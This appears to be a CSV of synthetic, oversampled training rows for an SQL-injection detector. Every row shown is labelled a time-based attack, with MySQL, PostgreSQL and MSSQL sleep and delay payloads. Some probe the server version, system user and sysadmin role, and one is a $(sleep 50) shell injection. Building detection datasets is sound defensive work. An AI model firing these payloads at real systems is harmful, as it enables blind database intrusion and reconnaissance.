id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000035,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.44633953605511306
SMOTE_000036,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.1480539624835487
SMOTE_000037,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,1.2059658417712484
SMOTE_000038,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.044851603375406
SMOTE_000039,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.503979924512032
SMOTE_000040,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.9661480394466985
SMOTE_000041,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,2.142572034024487
SMOTE_000042,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.6533663767294292
SMOTE_000043,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.4226873872970178
SMOTE_000044,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.2748768296777673
SMOTE_000045,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,2.1201599892137972
SMOTE_000046,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.030988335780368
SMOTE_000047,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.278436824868531
SMOTE_000048,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.5597965714863942
SMOTE_000049,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.054476244795439444
SMOTE_000050,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.7275348028343411
SMOTE_000051,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.31758008919675357
SMOTE_000052,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.3660152176555087
SMOTE_000053,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.00606299358244697
SMOTE_000054,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.09015704252503805
SMOTE_000055,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.09049162711751593
SMOTE_000056,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.4973657569485737
SMOTE_000057,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.19107397340293195
SMOTE_000058,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.4256151107309194
SMOTE_000059,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.8001412786349418
SMOTE_000060,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.39201398561124506
SMOTE_000061,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.5177240481898164
SMOTE_000062,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.124203986040123
SMOTE_000063,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.036228579990188754
SMOTE_000064,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.02918211044612896
SMOTE_000065,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.5482690538513043
SMOTE_000066,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.4407333681432136
SMOTE_000067,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.5719715576216404
SMOTE_000068,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.3355282132430681
SMOTE_000069,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.8439195030976385
SMOTE_000070,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.341830960086764
SMOTE_000071,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.1259372946804436
SMOTE_000072,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.0317427455573267
SMOTE_000073,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,2.1007191428301732
SMOTE_000074,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.1743543063180462
SMOTE_000075,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.005331382792121336
SMOTE_000076,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.3289207834775618
SMOTE_000077,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.6004745446804337
SMOTE_000078,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.001209108343460188
SMOTE_000079,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.4479746372373209
SMOTE_000080,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.5456526411170504
SMOTE_000081,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.6588392155400098
SMOTE_000082,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.14811740498139458
SMOTE_000083,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.5520703516629727
SMOTE_000084,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.9932851110361469
SMOTE_000085,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,3.942464578467841
SMOTE_000086,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.6884511720589739
SMOTE_000087,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.6554397533143934
SMOTE_000088,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.1831403594954428
SMOTE_000089,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.064508018511365
SMOTE_000090,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.8375212000675047
SMOTE_000091,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.183662791283955
SMOTE_000092,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.5438410500173427
SMOTE_000093,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.3969057194493248
SMOTE_000094,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.2453838665607713
SMOTE_000095,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.5975246416371756
SMOTE_000096,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.6524295060278003
SMOTE_000097,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.8464888900993028
SMOTE_000098,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.11584338813699817
SMOTE_000099,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.4218647230837025
SMOTE_000100,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.005437207199298544
SMOTE_000101,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,2.2833305846948715
SMOTE_000102,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.3595079111267388
SMOTE_000103,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.8537748854543394
SMOTE_000104,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.39155606401442894
SMOTE_000105,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,2.3482994584097066
SMOTE_000106,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,2.266869303583691
SMOTE_000107,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.067413833956581
SMOTE_000108,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.7059558929858254
SMOTE_000109,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.9409609122135363
SMOTE_000110,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.4839593033965571
SMOTE_000111,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.1504458941027352
SMOTE_000112,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.6901493238308781
SMOTE_000113,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.965672584635321
SMOTE_000114,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.13059113453489807
SMOTE_000115,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.6946907514179725
SMOTE_000116,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.342339150717158
SMOTE_000117,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.06133892677501257
SMOTE_000118,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.091827696416885
SMOTE_000119,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,2.249466266466685
SMOTE_000120,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.526704050526881
SMOTE_000121,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.211082286518178
SMOTE_000122,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.030882135210709604
SMOTE_000123,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.8309794663998684
SMOTE_000124,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.265225150710729
SMOTE_000125,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.03752624841282959
SMOTE_000126,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.079943405687159
SMOTE_000127,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.3621388695014377
SMOTE_000128,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.020454648763999494
SMOTE_000129,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.506584820821438
SMOTE_000130,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.8149851854246486
SMOTE_000131,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.5829873794367753
SMOTE_000132,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.6510994482096559
SMOTE_000133,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.42489585505019256
SMOTE_000134,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.7483806211575605
SMOTE_000135,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.001195930045309142
SMOTE_000136,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.5005934549246457
SMOTE_000137,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,2.4430038945779406
SMOTE_000138,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.8039803027938054
SMOTE_000139,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.2896984124433863
SMOTE_000140,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.2630605862185485
SMOTE_000141,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.5522496003606403
SMOTE_000142,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.0317750148744567
SMOTE_000143,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.1371009272475336
SMOTE_000144,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.00027242191881448767
SMOTE_000145,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.3229254461513781
SMOTE_000146,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.32045505132086116
SMOTE_000147,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.5832296659407791
SMOTE_000148,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,2.1240201513394976
SMOTE_000149,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.4591731489320594
SMOTE_000150,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.3738111270581183
SMOTE_000151,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.19894163675147125
SMOTE_000152,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.13954350149639838
SMOTE_000153,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,1.2417181669871504
SMOTE_000154,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,2.7276820937076622
SMOTE_000155,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.6096187121184042
SMOTE_000156,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.39054729882768086
SMOTE_000157,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.9112737775660573
SMOTE_000158,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.8486031228845345
SMOTE_000159,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.4640514158890294
SMOTE_000160,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.09032468749076182
SMOTE_000161,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,2.6492076262548583
SMOTE_000162,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.8761847127217556
SMOTE_000163,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.21428424372222996
SMOTE_000164,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.8530175388305148
SMOTE_000165,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.716125640225665
SMOTE_000166,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,2.4732013854723864
SMOTE_000167,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.2476481112125473
SMOTE_000168,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.3701401095899824
SMOTE_000169,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.21979880117369588
SMOTE_000170,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.8066265130110216
SMOTE_000171,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.1662498273254465
SMOTE_000172,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.0833176483147513
SMOTE_000173,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.6020848482670724
SMOTE_000174,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.020541281502337055
SMOTE_000175,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.3709438766150647
SMOTE_000176,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.1874897388504437
SMOTE_000177,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.29510439209160133
SMOTE_000178,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.7272278575444281
SMOTE_000179,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.4417711903680188
SMOTE_000180,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.0792820806045408
SMOTE_000181,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.28480040686697655
SMOTE_000182,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.0112370093525545
SMOTE_000183,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.33269446930340746
SMOTE_000184,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.1605702723316074
SMOTE_000185,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,2.0289555642886166
SMOTE_000186,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.1030214451684706
SMOTE_000187,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.4817643658635913
SMOTE_000188,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.06800475668945401
SMOTE_000189,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.9289647450290748
SMOTE_000190,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.44962419427955586
SMOTE_000191,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.16820037079790653
SMOTE_000192,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.040565048713100404
SMOTE_000193,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,2.5524819617277408
SMOTE_000194,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.7077628975800149
SMOTE_000195,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,2.83696708449689
SMOTE_000196,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.830604459429304
SMOTE_000197,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.1794397553528686
SMOTE_000198,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.27900435316187316
SMOTE_000199,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.42667990936114814
SMOTE_000200,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.386396743168791
SMOTE_000201,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.3219788597443987
SMOTE_000202,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.5134190392964947
SMOTE_000203,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.042622154354441145
SMOTE_000204,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.0017312188108676396
SMOTE_000205,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.344130461656388
